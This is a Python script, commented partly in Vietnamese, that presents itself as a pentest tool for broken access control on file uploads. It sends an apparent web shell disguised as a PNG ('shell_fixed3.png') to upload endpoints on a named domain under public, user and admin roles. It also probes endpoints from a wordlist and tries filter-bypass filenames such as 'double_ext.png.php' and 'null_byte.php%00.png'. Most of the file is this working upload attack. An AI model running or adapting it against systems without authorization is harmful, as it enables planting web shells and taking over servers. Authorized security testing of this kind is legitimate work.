import requests
import sys
import os
from urllib.parse import urljoin
from datetime import datetime
import argparse
from typing import Dict, List, Optional
import io
import magic  # Thư viện python-magic để kiểm tra MIME type

# Tạo file log để ghi kết quả
def log_result(message: str, log_file: str = "pentest_bac_log.txt"):
    """Ghi kết quả vào file log với timestamp."""
    with open(log_file, "a", encoding="utf-8") as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] {message}\n")

def load_wordlist(wordlist_path: str) -> List[str]:
    """Tải danh sách các đường dẫn từ file wordlist."""
    try:
        with open(wordlist_path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Error: Wordlist file {wordlist_path} not found.")
        sys.exit(1)

def fetch_csrf_token(base_url: str, endpoint: str, headers: Dict, cookies: Dict) -> Optional[str]:
    """Lấy CSRF token từ trang web (nếu cần) qua GET request."""
    try:
        url = urljoin(base_url, endpoint)
        response = requests.get(url, headers=headers, cookies=cookies, verify=True, allow_redirects=True, timeout=10)
        if response.status_code == 200:
            # Tìm CSRF token trong HTML (giả định, cần điều chỉnh theo web)
            csrf_token = None
            if "csrf_token" in response.text.lower():
                csrf_token = response.text.split('name="csrf_token" value="')[1].split('"')[0]
            return csrf_token
        return None
    except requests.RequestException as e:
        print(f"Error fetching CSRF token: {e}")
        log_result(f"Error fetching CSRF token for {url}: {e}")
        return None

def test_broken_access_control(base_url: str, target_endpoints: List[str], file_path: str, headers_list: List[Dict], cookies_list: List[Dict], wordlist_path: Optional[str] = None):
    """
    Test Broken Access Control by attempting to upload files with different roles/permissions and endpoints.
    
    Parameters:
    - base_url: Base URL of the target (e.g., "https://capstoneprjfuhcm.id.vn")
    - target_endpoints: List of endpoints to test (e.g., ["/uploads/", "/admin/upload"])
    - file_path: Path to the file to upload (e.g., "shell_fixed3.png")
    - headers_list: List of HTTP headers for different roles (e.g., public, user, admin)
    - cookies_list: List of cookies for different roles (e.g., public, user, admin)
    - wordlist_path: Path to wordlist file for additional endpoints (optional)
    """
    # Load wordlist if provided
    additional_endpoints = load_wordlist(wordlist_path) if wordlist_path else []

    # Combine target endpoints with wordlist endpoints
    all_endpoints = target_endpoints + additional_endpoints

    try:
        # Read the original file once and keep it in memory
        with open(file_path, "rb") as original_file:
            original_content = original_file.read()
            original_filename = os.path.basename(file_path)

        # Kiểm tra MIME type của file bằng python-magic
        try:
            mime = magic.Magic(mime=True)
            file_mime = mime.from_file(file_path)
            if not file_mime.startswith('image/png'):
                print(f"Warning: File {file_path} is not a valid PNG (MIME: {file_mime}). Skipping upload.")
                log_result(f"Warning: File {file_path} is not a valid PNG (MIME: {file_mime}). Skipping upload.")
                return
        except Exception as e:
            print(f"Error checking MIME type: {e}")
            log_result(f"Error checking MIME type for {file_path}: {e}")
            return

        for endpoint in all_endpoints:
            upload_url = urljoin(base_url, endpoint.strip("/"))
            
            # Test with different roles (public, user, admin)
            for i, (headers, cookies) in enumerate(zip(headers_list, cookies_list)):
                role = ["Public", "User", "Admin"][i] if i < 3 else f"Role_{i}"
                print(f"\nTesting {role} access to {upload_url}...")
                
                # Fetch CSRF token if needed (giả định endpoint có form upload)
                csrf_token = fetch_csrf_token(base_url, endpoint, headers, cookies)
                if csrf_token:
                    headers["X-CSRF-Token"] = csrf_token  # Thêm CSRF token vào header (tùy chỉnh theo web)

                # Prepare files for upload using BytesIO for original file
                file_obj = io.BytesIO(original_content)
                file_obj.name = original_filename  # Set filename for requests

                upload_files = {"file": file_obj}
                upload_files["file"].name = original_filename  # Ensure filename is correct for requests

                # Thêm các tham số form khác nếu cần (dựa trên Burp Suite)
                data = {}
                if csrf_token:
                    data["csrf_token"] = csrf_token

                response = requests.post(upload_url, files=upload_files, data=data, headers=headers, cookies=cookies, verify=True, allow_redirects=True, timeout=10)
                
                # Log full response for debugging
                log_message = f"Endpoint: {upload_url}, Role: {role}, Status Code: {response.status_code}, Final URL: {response.url}, Response: {response.text[:200]}..."
                print(log_message)
                log_result(log_message)

                # Check for Broken Access Control (e.g., unauthorized upload success)
                if response.status_code in [200, 201]:
                    print(f"WARNING: Possible Broken Access Control detected - {role} can upload to {upload_url}!")
                    log_result(f"WARNING: Possible Broken Access Control detected - {role} can upload to {upload_url}!")
                else:
                    print(f"No Broken Access Control detected for {role} on {upload_url}.")
                    log_result(f"No Broken Access Control detected for {role} on {upload_url}.")

            # Test additional file types (double extension, null byte)
            test_files = [
                ("double_ext.png.php", original_content),
                ("null_byte.php%00.png", original_content)
            ]
            for filename, file_content in test_files:
                # Prepare files for upload using BytesIO for modified files
                file_obj = io.BytesIO(file_content)
                file_obj.name = filename  # Set filename for requests

                modified_files = {"file": file_obj}
                
                # Thêm các tham số form khác nếu cần
                data = {}
                if csrf_token:
                    data["csrf_token"] = csrf_token

                for i, (headers, cookies) in enumerate(zip(headers_list, cookies_list)):
                    role = ["Public", "User", "Admin"][i] if i < 3 else f"Role_{i}"
                    print(f"\nTesting {role} access to {upload_url} with {filename}...")
                    
                    # Fetch CSRF token if needed
                    csrf_token = fetch_csrf_token(base_url, endpoint, headers, cookies)
                    if csrf_token:
                        headers["X-CSRF-Token"] = csrf_token

                    response = requests.post(upload_url, files=modified_files, data=data, headers=headers, cookies=cookies, verify=True, allow_redirects=True, timeout=10)
                    
                    log_message = f"Endpoint: {upload_url}, Role: {role}, File: {filename}, Status Code: {response.status_code}, Final URL: {response.url}, Response: {response.text[:200]}..."
                    print(log_message)
                    log_result(log_message)

                    if response.status_code in [200, 201]:
                        print(f"WARNING: Possible Broken Access Control detected - {role} can upload {filename} to {upload_url}!")
                        log_result(f"WARNING: Possible Broken Access Control detected - {role} can upload {filename} to {upload_url}!")
                    else:
                        print(f"No Broken Access Control detected for {role} with {filename} on {upload_url}.")
                        log_result(f"No Broken Access Control detected for {role} with {filename} on {upload_url}.")

    except FileNotFoundError:
        print(f"Error: File {file_path} not found. Please ensure it exists.")
        log_result(f"Error: File {file_path} not found.")
    except requests.RequestException as e:
        print(f"Error: {e}")
        log_result(f"Error: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")
        log_result(f"Unexpected error: {e}")

def main():
    # Argument parser for user input
    parser = argparse.ArgumentParser(description="Pentest Tool for Broken Access Control")
    parser.add_argument("--url", required=True, help="Base URL of the target (e.g., https://capstoneprjfuhcm.id.vn)")
    parser.add_argument("--endpoints", nargs="+", default=["/uploads/", "/admin/upload"], help="Endpoints to test (space-separated)")
    parser.add_argument("--file", required=True, help="Path to the file to upload (e.g., shell_fixed3.png)")
    parser.add_argument("--wordlist", default=None, help="Path to wordlist file for additional endpoints")
    
    args = parser.parse_args()

    # Configure headers and cookies for different roles
    headers_list = [
        {},  # Public (no auth)
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"},  # User (optional, empty if no user)
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
         "Cookie": "session=admin_session_token_here"}  # Admin (replace with real token if available)
    ]
    
    cookies_list = [
        {},  # Public (no auth)
        {},  # User (optional, empty if no user)
        {"session": "admin_session_token_here"}  # Admin (replace with real token if available)
    ]

    # Run the test
    test_broken_access_control(args.url, args.endpoints, args.file, headers_list, cookies_list, args.wordlist)

if __name__ == "__main__":
    main()